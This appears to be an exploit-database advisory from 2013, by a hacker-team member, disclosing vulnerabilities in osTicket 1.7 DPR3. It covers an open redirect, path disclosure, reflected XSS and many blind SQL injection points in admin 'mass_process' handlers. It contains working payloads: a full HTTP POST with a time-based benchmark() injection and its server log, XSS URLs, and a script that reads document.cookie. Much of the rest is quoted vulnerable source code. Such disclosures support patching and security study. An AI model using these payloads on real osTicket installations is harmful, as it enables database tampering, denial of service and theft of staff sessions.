@@ -1,0 +1,776 @@
+id: 20100
+date: 01/06/2013
+title: osTicket 1.7 DPR3 XSS / Disclosure / Redirect / SQL Injection Vulnerabilities
+author: AkaStep
+cves: 
+
+1-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=0
+0     _                   __           __       __                     1
+1   /' \            __  /'__`\        /\ \__  /'__`\                   0
+0  /\_, \    ___   /\_\/\_\ \ \    ___\ \ ,_\/\ \/\ \  _ ___           1
+1  \/_/\ \ /' _ `\ \/\ \/_/_\_<_  /'___\ \ \/\ \ \ \ \/\`'__\          0
+0     \ \ \/\ \/\ \ \ \ \/\ \ \ \/\ \__/\ \ \_\ \ \_\ \ \ \/           1
+1      \ \_\ \_\ \_\_\ \ \ \____/\ \____\\ \__\\ \____/\ \_\           0
+0       \/_/\/_/\/_/\ \_\ \/___/  \/____/ \/__/ \/___/  \/_/           1
+1                  \ \____/ >> Exploit database separated by exploit   0
+0                   \/___/          type (local, remote, DoS, etc.)    1
+1                                                                      1
+0  [+] Site            : 1337day.com                                   0
+1  [+] Support e-mail  : submit[at]1337day.com                         1
+0                                                                      0
+1               #########################################              1
+0               I'm AkaStep member from Inj3ct0r Team                  1
+1               #########################################              0
+0-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-==-=-=-1
+
+=================================================
+Vulnerable Software: osTicket (v1.7-DPR3)
+Official Site:http://www.osticket.com
+Tested Version: osTicket (v1.7-DPR3)
+Vulns: PATH DISCLOSURE+XSS+Open Redirect+Blind SQLi
+=================================================
+
+=================================================
+Tested on:
+*php.ini MAGIC_QUOTES_GPC OFF*
+Safe mode off
+/*
+OS: Windows XP SP2 (32 bit)
+Apache: 2.2.21.0
+PHP Version: 5.2.17.17
+MYSQL:  5.5.24
+*/
+=================================================
+
+
+
+osTicket (v1.7-DPR3)
+
+
+My suggestion is that:If possible after sucessfully installation of application give to user to protect that setup/ dir like button:
+When the user press OK~PROTECT THIS DIR~ automatically create .htaccess(deny from all) file in setup/ dir.
+
+
+Ok,now about vulns.
+
+
+
+---------------------Open Redirect VUln--------------------------
+l.php
+
+http://192.168.0.15/learn/ostickRC/scp/l.php?url=http://somephish.site/phish.html
+
+Open Redirect vulnerability.(Usefull for Phish)
+If possible limit it only your to your own domain only.
++
+If possible tokenize it too (antiCSRF to avoid risk)
+------------------------------------------------------------------
+
+=============================l.php XSS================================================
+l.php XSS or script insertion.
+// $url unsanitized
+<?php
+/*********************************************************************
+    l.php
+
+    Link redirection
+
+    Jared Hancock <jared@osticket.com>
+    Copyright (c)  2006-2012 osTicket
+    http://www.osticket.com
+
+    Released under the GNU General Public License WITHOUT ANY WARRANTY.
+    See LICENSE.TXT for details.
+
+    vim: expandtab sw=4 ts=4 sts=4:
+**********************************************************************/
+require 'secure.inc.php';
+
+global $_GET;
+$url = $_GET['url'];
+if (!$url) exit();
+?>
+<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/html4/strict.dtd">
+<html>
+<head>
+    <meta http-equiv="content-type" content="text/html; charset=utf-8"/>
+    <meta http-equiv="refresh" content="0;<?php echo $url; ?>"/>
+</head>
+<body/>
+</html>
+===========================================================================================
+
+
+
+/include/   dir missing .htaccess (deny from all).
+
+==================scp/l.php================================================================
+/scp/l.php
+http://192.168.0.15/learn/ostickRC/scp/l.php?url=<script>alert(1);</script>
+XSS same l.php issuse:
+===========================================================================================
+
+
+
+scp/slas.php
+BLIND SQL injection due direct usage $_POST['ids'] without sanitization (needs db_input())
+
+
+====================scp/slas.php====================================================================
+<?php
+/*********************************************************************
+    slas.php
+
+    SLA - Service Level Agreements
+
+    Peter Rotich <peter@osticket.com>
+    Copyright (c)  2006-2012 osTicket
+    http://www.osticket.com
+
+    Released under the GNU General Public License WITHOUT ANY WARRANTY.
+    See LICENSE.TXT for details.
+
+    vim: expandtab sw=4 ts=4 sts=4:
+**********************************************************************/
+require('admin.inc.php');
+include_once(INCLUDE_DIR.'class.sla.php');
+
+$sla=null;
+if($_REQUEST['id'] && !($sla=SLA::lookup($_REQUEST['id'])))
+    $errors['err']='Unknown or invalid API key ID.';
+
+if($_POST){
+    switch(strtolower($_POST['do'])){
+        case 'update':
+            if(!$sla){
+                $errors['err']='Unknown or invalid SLA plan.';
+            }elseif($sla->update($_POST,$errors)){
+                $msg='SLA plan updated successfully';
+            }elseif(!$errors['err']){
+                $errors['err']='Error updating SLA plan. Try again!';
+            }
+            break;
+        case 'add':
+            if(($id=SLA::create($_POST,$errors))){
+                $msg='SLA plan added successfully';
+                $_REQUEST['a']=null;
+            }elseif(!$errors['err']){
+                $errors['err']='Unable to add SLA plan. Correct error(s) below and try again.';
+            }
+            break;
+        case 'mass_process':
+            if(!$_POST['ids'] || !is_array($_POST['ids']) || !count($_POST['ids'])) {
+                $errors['err']='You must select at least one plan.';
+            }else{
+                $count=count($_POST['ids']);
+                if($_POST['enable']){
+                    $sql='UPDATE '.SLA_TABLE.' SET isactive=1 WHERE id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())){
+                        if($num==$count)
+                            $msg='Selected SLA plans enabled';
+                        else
+                            $warn="$num of $count selected SLA plans enabled";
+                    }else{
+                        $errors['err']='Unable to enable selected SLA plans.';
+                    }
+                }elseif($_POST['disable']){
+                    $sql='UPDATE '.SLA_TABLE.' SET isactive=0  WHERE id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())) {
+                        if($num==$count)
+                            $msg='Selected SLA plans disabled';
+                        else
+                            $warn="$num of $count selected SLA plans disabled";
+                    }else{
+                        $errors['err']='Unable to disable selected SLA plans';
+                    }
+
+                }elseif($_POST['delete']){
+                    $i=0;
+                    foreach($_POST['ids'] as $k=>$v) {
+                        if(($p=SLA::lookup($v)) && $p->delete())
+                            $i++;
+                    }
+
+                    if($i && $i==$count)
+                        $msg='Selected SLA plans deleted successfully';
+                    elseif($i>0)
+                        $warn="$i of $count selected SLA plans deleted";
+                    elseif(!$errors['err'])
+                        $errors['err']='Unable to delete selected SLA plans';
+
+                }else {
+                    $errors['err']='Unknown action';
+                }
+            }
+            break;
+        default:
+            $errors['err']='Unknown action';
+            break;
+    }
+}
+
+$page='slaplans.inc.php';
+if($sla || ($_REQUEST['a'] && !strcasecmp($_REQUEST['a'],'add')))
+    $page='slaplan.inc.php';
+
+$nav->setTabActive('settings');
+require(STAFFINC_DIR.'header.inc.php');
+require(STAFFINC_DIR.$page);
+include(STAFFINC_DIR.'footer.inc.php');
+?>
+
+=============================================================================================
+
+
+
+Warning: is_readable() [function.is-readable]: open_basedir restriction in effect. File(/dev/urandom) is not within the allowed path(s): (C:/Program Files/Apache Software Foundation/Apache2.2/htdocs/learn;C:\DOCUME~1\Apache\LOCALS~1\Temp) in C:\Program Files\Apache Software Foundation\Apache2.2\htdocs\learn\ostickRC\include\PasswordHash.php on line 51
+
+
+
+
+BLIND SQL INJECTION.(I'm using here becnhmark() way to be more "sensitive" and detect vuln)
+//scp/staff.php
+again due direct usage implode(',',$_POST['ids']) in sql query without db_input().
+
+
+snip from scp/staff.php
+===============================================================================================
+        case 'mass_process':
+            if(!$_POST['ids'] || !is_array($_POST['ids']) || !count($_POST['ids'])) {
+                $errors['err']='You must select at least one staff member.';
+            }elseif(in_array($thisstaff->getId(),$_POST['ids'])) {
+                $errors['err']='You can not disable/delete yourself - you could be the only admin!';
+            }else{
+                $count=count($_POST['ids']);
+                if($_POST['enable']){
+                    $sql='UPDATE '.STAFF_TABLE.' SET isactive=1 WHERE staff_id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())){
+                        if($num==$count)
+                            $msg='Selected staff activated';
+                        else
+                            $warn="$num of $count selected staff activated";
+                    }else{
+                        $errors['err']='Unable to activate selected staff';
+                    }
+                }elseif($_POST['disable']){
+                    $sql='UPDATE '.STAFF_TABLE.' SET isactive=0  '.
+                         'WHERE staff_id IN ('.implode(',',$_POST['ids']).') AND staff_id!='.db_input($thisstaff->getId());
+                    if(db_query($sql) && ($num=db_affected_rows())) {
+                        if($num==$count)
+                            $msg='Selected staff disabled';
+===============================================================================================
+
+
+POST http://192.168.0.15/learn/ostickRC/scp/staff.php HTTP/1.0
+Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */*
+Referer: http://192.168.0.15/learn/ostickRC/scp/staff.php
+Content-Type: application/x-www-form-urlencoded
+User-Agent: Mozilla/4.0 (compatible; MSIE 5.5; Windows 98; DigExt)
+Host: 192.168.0.15
+Content-Length: 90
+Cookie: ASPX=6372nnqs3u1oplhouh99s7b6a6rh7j66
+
+do=mass_process&ids%5B%5D=1) or benchmark(50000000000000,md5(now())) or (1=0&enable=Enable
+
+
+
+Works and i'm getting:
+
+Possible DOS Attack Against MYSQL Server [Prevented]
+Attack Prevented on: 16:04:02:468 01/06/2012
+Attack Duration: 15 seconds
+Command: Query
+     db: ost
+   Host: worker.com:1182
+   User: ost
+     Id: 548
+   Time: 15
+  State: init
+   Info: UPDATE ost170_staff SET isactive=1 WHERE staff_id IN (1) or benchmark(50000000000000,md5(now())) or (1=0)
+=======================================================================================================================
+
+Returned status code: http:504
+[Fiddler] ReadResponse() failed: The server did not return a response for this request.
+
+
+
+==============================================XSS==================================================
+XSS:
+http://192.168.0.15/learn/ostickRC/scp/tickets.php?a=export&h=9c2601b88c05055b51962b140f5121389&status=%22%20onmouseover=%22alert%281%29%22
+try to move your mouse over:  Page: [1] Export you will see it.
+
+parameter &status is vulnerable in this case.
+====================================================================================================
+
+
+
+
+Possible prone to sql injection:
+include/class.staff.php
+Notice: $teams
+//$sql.=' AND team_id NOT IN('.implode(',', $teams).')';
+
+Snip:
+
+=================================
+    function updateTeams($teams) {
+
+        if($teams) {
+            foreach($teams as $k=>$id) {
+                $sql='INSERT IGNORE INTO '.TEAM_MEMBER_TABLE.' SET updated=NOW() '
+                    .' ,staff_id='.db_input($this->getId()).', team_id='.db_input($id);
+                db_query($sql);
+            }
+        }
+        $sql='DELETE FROM '.TEAM_MEMBER_TABLE.' WHERE staff_id='.db_input($this->getId());
+        if($teams)
+            $sql.=' AND team_id NOT IN('.implode(',', $teams).')';
+
+        db_query($sql);
+
+        return true;
+    }
+===================================
+
+===================================================================================================
+
+
+
+
+//include/class.staff.php
+If possible sanitize all vars before passing it to syslogs:
+
+============================= SNIP =================================
+        //If we get to this point we know the login failed.
+        $_SESSION['_staff']['strikes']+=1;
+        if(!$errors && $_SESSION['_staff']['strikes']>$cfg->getStaffMaxLogins()) {
+            $errors['err']='Forgot your login info? Contact Admin.';
+            $_SESSION['_staff']['laststrike']=time();
+            $alert='Excessive login attempts by a staff member?'."\n".
+                   'Username: '.$_POST['username']."\n".'IP: '.$_SERVER['REMOTE_ADDR']."\n".'TIME: '.date('M j, Y, g:i a T')."\n\n".
+                   'Attempts #'.$_SESSION['_staff']['strikes']."\n".'Timeout: '.($cfg->getStaffLoginTimeout()/60)." minutes \n\n";
+            Sys::log(LOG_ALERT,'Excessive login attempts ('.$_POST['username'].')', $alert,($cfg->alertONLoginError()));
+
+        } elseif($_SESSION['_staff']['strikes']%2==0) { //Log every other failed login attempt as a warning.
+            $alert='Username: '.$_POST['username']."\n".'IP: '.$_SERVER['REMOTE_ADDR'].
+                   "\n".'TIME: '.date('M j, Y, g:i a T')."\n\n".'Attempts #'.$_SESSION['_staff']['strikes'];
+            Sys::log(LOG_WARNING,'Failed staff login attempt ('.$_POST['username'].')', $alert);
+        }
+
+        return false;
+    }
+============================= EOF SNIP===============================
+
+
+scp/departments.php
+
+SQL injection:
+===========================================================================
+
+        case 'mass_process':
+            if(!$_POST['ids'] || !is_array($_POST['ids']) || !count($_POST['ids'])) {
+                $errors['err']='You must select at least one department';
+            }elseif(!$_POST['public'] && in_array($cfg->getDefaultDeptId(),$_POST['ids'])) {
+                $errors['err']='You can not disable/delete a default department. Remove default Dept. and try again.';
+            }else{
+                $count=count($_POST['ids']);
+                if($_POST['public']){
+                    $sql='UPDATE '.DEPT_TABLE.' SET ispublic=1 WHERE dept_id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())){
+                        if($num==$count)
+                            $msg='Selected departments made public';
+                        else
+                            $warn="$num of $count selected departments made public";
+                    }else{
+                        $errors['err']='Unable to make selected department public.';
+                    }
+                }elseif($_POST['private']){
+                    $sql='UPDATE '.DEPT_TABLE.' SET ispublic=0  '.
+                         'WHERE dept_id IN ('.implode(',',$_POST['ids']).') AND dept_id!='.db_input($cfg->getDefaultDeptId());
+                    if(db_query($sql) && ($num=db_affected_rows())) {
+                        if($num==$count)
+                            $msg='Selected departments made private';
+                        else
+                            $warn="$num of $count selected departments made private";
+                    }else{
+                        $errors['err']='Unable to make selected department(s) private. Possibly already private!';
+                    }
+
+                }elseif($_POST['delete']){
+                    //Deny all deletes if one of the selections has members in it.
+                    $sql='SELECT count(staff_id) FROM '.STAFF_TABLE.' WHERE dept_id IN ('.implode(',',$_POST['ids']).')';
+                    list($members)=db_fetch_row(db_query($sql));
+                    if($members)
+============================================================================
+
+
+============================================================================
+
+//scp/templates.php
+blind SQL injection
+
+       case 'mass_process':
+            if(!$_POST['ids'] || !is_array($_POST['ids']) || !count($_POST['ids'])) {
+                $errors['err']='You must select at least one template to process.';
+            }else{
+                $count=count($_POST['ids']);
+                if($_POST['enable']){
+                    $sql='UPDATE '.EMAIL_TEMPLATE_TABLE.' SET isactive=1 WHERE tpl_id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())){
+                        if($num==$count)
+                            $msg='Selected templates enabled';
+                        else
+                            $warn="$num of $count selected templates enabled";
+                    }else{
+======================= EOF SNIP=======================
+
+//scp/teams.php
+
+Blind SQl injection again:
+Notice:  WHERE team_id IN ('.implode(',',$_POST['ids']).')
+
+
+        case 'mass_process':
+            if(!$_POST['ids'] || !is_array($_POST['ids']) || !count($_POST['ids'])) {
+                $errors['err']='You must select at least one team.';
+            }else{
+                $count=count($_POST['ids']);
+                if($_POST['enable']){
+                    $sql='UPDATE '.TEAM_TABLE.' SET isenabled=1 WHERE team_id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())){
+                        if($num==$count)
+                            $msg='Selected teams activated';
+                        else
+                            $warn="$num of $count selected teams activated";
+                    }else{
+                        $errors['err']='Unable to activate selected teams';
+                    }
+                }elseif($_POST['disable']){
+                    $sql='UPDATE '.TEAM_TABLE.' SET isenabled=0 WHERE team_id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())) {
+
+=============================================================
+
+//scp/syslogs.php
+Blind Sql Injection:
+
+        case 'mass_process':
+            if(!$_POST['ids'] || !is_array($_POST['ids']) || !count($_POST['ids'])) {
+                $errors['err']='You must select at least one log to delete';
+            }else{
+                $count=count($_POST['ids']);
+                if($_POST['delete']){
+                    $sql='DELETE FROM '.SYSLOG_TABLE.' WHERE log_id IN ('.implode(',',$_POST['ids']).')';
+
+==============================================================
+
+
+//scp/helptopics.php
+
+Blind SQL Injection:
+
+        case 'mass_process':
+            if(!$_POST['ids'] || !is_array($_POST['ids']) || !count($_POST['ids'])) {
+                $errors['err']='You must select at least one help topic';
+            }else{
+                $count=count($_POST['ids']);
+                if($_POST['enable']){
+                    $sql='UPDATE '.TOPIC_TABLE.' SET isactive=1 WHERE topic_id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())){
+                        if($num==$count)
+                            $msg='Selected help topics enabled';
+                        else
+                            $warn="$num of $count selected help topics enabled";
+                    }else{
+                        $errors['err']='Unable to enable selected help topics.';
+                    }
+                }elseif($_POST['disable']){
+                    $sql='UPDATE '.TOPIC_TABLE.' SET isactive=0  WHERE topic_id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())) {
+=============================================================
+
+
+=============================================================
+//scp/groups.php
+Blind Sql Injection again due implode(',',$_POST['ids']) thing in sql query.
+
+        case 'mass_process':
+            if(!$_POST['ids'] || !is_array($_POST['ids']) || !count($_POST['ids'])) {
+                $errors['err']='You must select at least one group.';
+            }else{
+                $count=count($_POST['ids']);
+                if($_POST['enable']){
+                    $sql='UPDATE '.GROUP_TABLE.' SET group_enabled=1, updated=NOW() WHERE group_id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())){
+                        if($num==$count)
+                            $msg='Selected groups activated';
+                        else
+                            $warn="$num of $count selected groups activated";
+                    }else{
+                        $errors['err']='Unable to activate selected groups';
+                    }
+                }elseif($_POST['disable']){
+                    $sql='UPDATE '.GROUP_TABLE.' SET group_enabled=0, updated=NOW() WHERE group_id IN ('.implode(',',$_POST['ids']).')';
+============================================================
+
+
+
+//scp/filters.php
+
+Blind Sql Injection:
+
+==================SNIP========================================
+        case 'mass_process':
+            if(!$_POST['ids'] || !is_array($_POST['ids']) || !count($_POST['ids'])) {
+                $errors['err']='You must select at least one filter to process.';
+            }else{
+                $count=count($_POST['ids']);
+                if($_POST['enable']){
+                    $sql='UPDATE '.EMAIL_FILTER_TABLE.' SET isactive=1 WHERE id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())){
+                        if($num==$count)
+                            $msg='Selected filters enabled';
+                        else
+                            $warn="$num of $count selected filters enabled";
+                    }else{
+                        $errors['err']='Unable to enable selected filters';
+                    }
+                }elseif($_POST['disable']){
+                    $sql='UPDATE '.EMAIL_FILTER_TABLE.' SET isactive=0  WHERE id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())) {
+                        if($num==$count)
+                            $msg='Selected filters disabled';
+                        else
+=====================EOF SNIP=================================
+
+
+include/class.faq.php
+Vulnerable to Blind SQL Injection  but a bit hard to exploit it.
+
+Notice:
+if($ids)
+      $sql.=' AND topic_id NOT IN('.implode(',',$ids).')';
+
+db_query($sql);
+
+
+==================SNIP========================================
+    function updateTopics($ids){
+
+        if($ids) {
+            $topics = $this->getHelpTopicsIds();
+            foreach($ids as $k=>$id) {
+                if($topics && in_array($id,$topics)) continue;
+                $sql='INSERT IGNORE INTO '.FAQ_TOPIC_TABLE
+                    .' SET faq_id='.db_input($this->getId())
+                    .', topic_id='.db_input($id);
+                db_query($sql);
+            }
+        }
+
+        $sql='DELETE FROM '.FAQ_TOPIC_TABLE.' WHERE faq_id='.db_input($this->getId());
+        if($ids)
+            $sql.=' AND topic_id NOT IN('.implode(',',$ids).')';
+
+        db_query($sql);
+
+        return true;
+    }
+=====================EOF SNIP=================================
+
+
+
+/scp/emails.php
+Blind SQl Injection:
+
+===================SNIP==========================
+        case 'mass_process':
+            if(!$_POST['ids'] || !is_array($_POST['ids']) || !count($_POST['ids'])) {
+                $errors['err']='You must select at least one email address';
+            }else{
+                $count=count($_POST['ids']);
+
+                $sql='SELECT count(dept_id) FROM '.DEPT_TABLE.' dept '.
+                     'WHERE email_id IN ('.implode(',',$_POST['ids']).') OR autoresp_email_id IN ('.implode(',',$_POST['ids']).')';
+                list($depts)=db_fetch_row(db_query($sql));
+
+==================EOF=============================
+
+
+
+//scp/categories.php
+
+Blind SQl Inj:
+Notice: usage of implode(',',$_POST['ids']) directly without any sanitization in SQL query.
+===================SNIP==========================
+        case 'mass_process':
+            if(!$_POST['ids'] || !is_array($_POST['ids']) || !count($_POST['ids'])) {
+                $errors['err']='You must select at least one category';
+            } else {
+                $count=count($_POST['ids']);
+                if($_POST['public']) {
+                    $sql='UPDATE '.FAQ_CATEGORY_TABLE.' SET ispublic=1 WHERE category_id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())) {
+                        if($num==$count)
+                            $msg='Selected categories made PUBLIC';
+                        else
+                            $warn="$num of $count selected categories made PUBLIC";
+                    } else {
+                        $errors['err']='Unable to enable selected categories public.';
+                    }
+                } elseif($_POST['private']) {
+                    $sql='UPDATE '.FAQ_CATEGORY_TABLE.' SET ispublic=0  WHERE category_id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())) {
+                        if($num==$count)
+                            $msg='Selected categories made PRIVATE';
+=====================EOF SNIP=================================
+
+
+//scp/canned.php
+
+Blind SQl Injection:
+===================SNIP==========================
+
+        case 'mass_process':
+            if(!$_POST['ids'] || !is_array($_POST['ids']) || !count($_POST['ids'])) {
+                $errors['err']='You must select at least one canned response';
+            } else {
+                $count=count($_POST['ids']);
+                if($_POST['enable']) {
+                    $sql='UPDATE '.CANNED_TABLE.' SET isenabled=1 WHERE canned_id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())) {
+                        if($num==$count)
+                            $msg='Selected canned replies enabled';
+                        else
+                            $warn="$num of $count selected canned replies enabled";
+                    } else {
+                        $errors['err']='Unable to enable selected canned replies.';
+                    }
+                } elseif($_POST['disable']) {
+                    $sql='UPDATE '.CANNED_TABLE.' SET isenabled=0  WHERE canned_id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())) {
+                        if($num==$count)
+                            $msg='Selected canned replies disabled';
+                        else
+                            $warn="$num of $count selected canned replies disabled";
+                    } else {
+=====================EOF SNIP========================
+
+
+//scp//banlist.php
+
+Blind SQl Injection:
+
+Notice:
+ ' AND id IN ('.implode(',',$_POST['ids']).')'
+===================SNIP==========================
+        case 'mass_process':
+            if(!$_POST['ids'] || !is_array($_POST['ids']) || !count($_POST['ids'])) {
+                $errors['err']='You must select at least one email to process.';
+            }else{
+                $count=count($_POST['ids']);
+                if($_POST['enable']){
+                    $sql='UPDATE '.EMAIL_FILTER_RULE_TABLE.' SET isactive=1 WHERE filter_id='.db_input($filter->getId()).
+                         ' AND id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())){
+                        if($num==$count)
+                            $msg='Selected emails ban status set to enabled';
+                        else
+                            $warn="$num of $count selected emails enabled";
+                    }else{
+                        $errors['err']='Unable to enable selected emails';
+                    }
+                }elseif($_POST['disable']){
+                    $sql='UPDATE '.EMAIL_FILTER_RULE_TABLE.' SET isactive=0  WHERE filter_id='.db_input($filter->getId()).
+                         ' AND id IN ('.implode(',',$_POST['ids']).')';
+=====================EOF SNIP========================
+
+
+
+
+//scp/apikeys.php
+===================SNIP==========================
+
+        case 'mass_process':
+            if(!$_POST['ids'] || !is_array($_POST['ids']) || !count($_POST['ids'])) {
+                $errors['err']='You must select at least one API key';
+            }else{
+                $count=count($_POST['ids']);
+                if($_POST['enable']){
+                    $sql='UPDATE '.API_KEY_TABLE.' SET isactive=1 WHERE id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())){
+                        if($num==$count)
+                            $msg='Selected API keys enabled';
+                        else
+                            $warn="$num of $count selected API keys enabled";
+                    }else{
+                        $errors['err']='Unable to enable selected API keys.';
+                    }
+                }elseif($_POST['disable']){
+                    $sql='UPDATE '.API_KEY_TABLE.' SET isactive=0  WHERE id IN ('.implode(',',$_POST['ids']).')';
+                    if(db_query($sql) && ($num=db_affected_rows())) {
+                        if($num==$count)
+                            $msg='Selected API keys disabled';
+                        else
+
+=====================EOF SNIP========================
+
+
+
+XSS (Cross Site Scripting Vuln) directory.php parameter q.
+
+
+http://192.168.0.15/learn/ostickRC/scp/directory.php?q=100%22+onmouseover%3D%22alert%281%29%22&did=0&submit=Filter
+
+parameter &q is vulnerable in this case
+
+
+http://192.168.0.15/learn/ostickRC/scp/directory.php?q=100%22/%3E%3Cscript%3Ealert%28document.cookie%29;%3C/script%3E
+Payload: "/><script>alert(document.cookie);</script>"
+
+>From source of code page:
+
+<form action="directory.php" method="GET" name="filter">
+       <input type="text" name="q" value="100"/><script>alert(document.cookie);</script>" >
+        <select name="did" id="did">
+             <option value="0">&mdash; All Department &mdash;</option>
+             <option value="2" >Billing (1)</option><option value="1" >Support (1)</option>        </select>
+        &nbps;&nbps;
+        <input type="submit" name="submit" value="Filter"/>
+    </form>
+
+
+And obviously we will get cookie.
+
+
+=========================== HAPPY NEW YEAR! ==================================
+
+
+================================================
+SHOUTZ+RESPECTS+GREAT THANKS TO ALL MY FRIENDS:
+================================================
+packetstormsecurity.org
+packetstormsecurity.com
+packetstormsecurity.net
+securityfocus.com
+cxsecurity.com
+security.nnov.ru
+securtiyvulns.com
+securitylab.ru
+secunia.com
+securityhome.eu
+exploitsdownload.com
+osvdb.com
+websecurity.com.ua
+1337day.com
+
+to all Aa Team + to all Azerbaijan Black HatZ
++ *Especially to my bro CAMOUFL4G3 *
+To All Turkish Hackers
+
+Also special thanks to: ottoman38 & HERO_AZE
+================================================
+
+/AkaStep
+
+#  0day.today [2023-03-26]  #
